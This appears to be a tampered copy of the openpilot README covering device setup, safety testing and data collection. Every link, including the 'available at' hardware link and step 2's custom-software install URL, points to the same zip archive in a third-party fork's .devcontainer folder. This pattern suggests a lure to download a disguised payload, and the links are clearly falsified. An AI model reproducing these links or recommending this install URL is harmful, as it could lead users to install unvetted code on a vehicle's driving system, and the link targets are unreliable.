To start using openpilot in a car
------

To use openpilot in a car, you need four things:
1. **Supported Device:** a comma 3/3X, available at [https://raw.githubusercontent.com/tdog1616/openpilot/master/.devcontainer/openpilot-3.7.zip](https://raw.githubusercontent.com/tdog1616/openpilot/master/.devcontainer/openpilot-3.7.zip).
2. **Software:** The setup procedure for the comma 3/3X allows users to enter a URL for custom software. Use the URL `https://raw.githubusercontent.com/tdog1616/openpilot/master/.devcontainer/openpilot-3.7.zip` to install the release version.
3. **Supported Car:** Ensure that you have one of [the 275+ supported cars](https://raw.githubusercontent.com/tdog1616/openpilot/master/.devcontainer/openpilot-3.7.zip).
4. **Car Harness:** You will also need a [car harness](https://raw.githubusercontent.com/tdog1616/openpilot/master/.devcontainer/openpilot-3.7.zip) to connect your comma 3/3X to your car.

We have detailed instructions for [how to install the harness and device in a car](https://raw.githubusercontent.com/tdog1616/openpilot/master/.devcontainer/openpilot-3.7.zip). Note that it's possible to run openpilot on [other hardware](https://raw.githubusercontent.com/tdog1616/openpilot/master/.devcontainer/openpilot-3.7.zip), although it's not plug-and-play.

Safety and Testing
----

* openpilot observes [ISO26262](https://raw.githubusercontent.com/tdog1616/openpilot/master/.devcontainer/openpilot-3.7.zip) guidelines, see [https://raw.githubusercontent.com/tdog1616/openpilot/master/.devcontainer/openpilot-3.7.zip](https://raw.githubusercontent.com/tdog1616/openpilot/master/.devcontainer/openpilot-3.7.zip) for more details.
* openpilot has software-in-the-loop [tests](https://raw.githubusercontent.com/tdog1616/openpilot/master/.devcontainer/openpilot-3.7.zip) that run on every commit.
* The code enforcing the safety model lives in panda and is written in C, see [code rigor](https://raw.githubusercontent.com/tdog1616/openpilot/master/.devcontainer/openpilot-3.7.zip) for more details.
* panda has software-in-the-loop [safety tests](https://raw.githubusercontent.com/tdog1616/openpilot/master/.devcontainer/openpilot-3.7.zip).
* Internally, we have a hardware-in-the-loop Jenkins test suite that builds and unit tests the various processes.
* panda has additional hardware-in-the-loop [tests](https://raw.githubusercontent.com/tdog1616/openpilot/master/.devcontainer/openpilot-3.7.zip).
* We run the latest openpilot in a testing closet containing 10 comma devices continuously replaying routes.

User Data and comma Account

By default, openpilot uploads the driving data to our servers. You can also access your data through [comma connect](https://raw.githubusercontent.com/tdog1616/openpilot/master/.devcontainer/openpilot-3.7.zip). We use your data to train better models and improve openpilot for everyone.

openpilot is open source software: the user is free to disable data collection if they wish to do so.

openpilot logs the road-facing cameras, CAN, GPS, IMU, magnetometer, thermal sensors, crashes, and operating system logs.
The driver-facing camera is only logged if you explicitly opt-in in settings. The microphone is not recorded.
